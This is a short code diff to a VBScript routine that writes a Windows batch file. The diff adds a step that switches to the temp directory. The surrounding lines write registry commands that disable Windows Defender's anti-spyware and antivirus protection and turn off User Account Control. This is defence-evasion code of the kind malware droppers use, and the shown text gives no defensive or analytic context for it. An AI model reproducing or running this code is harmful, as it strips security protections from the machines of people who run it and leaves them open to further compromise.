@@ -10,6 +10,7 @@ Sub CreateBatchFile(filePath)
     Set file = fso.CreateTextFile(filePath, True)
 
     file.WriteLine "@echo off"
+    file.WriteLine "cd /d %TEMP%"
     file.WriteLine "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f"
     file.WriteLine "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f"
     file.WriteLine "reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
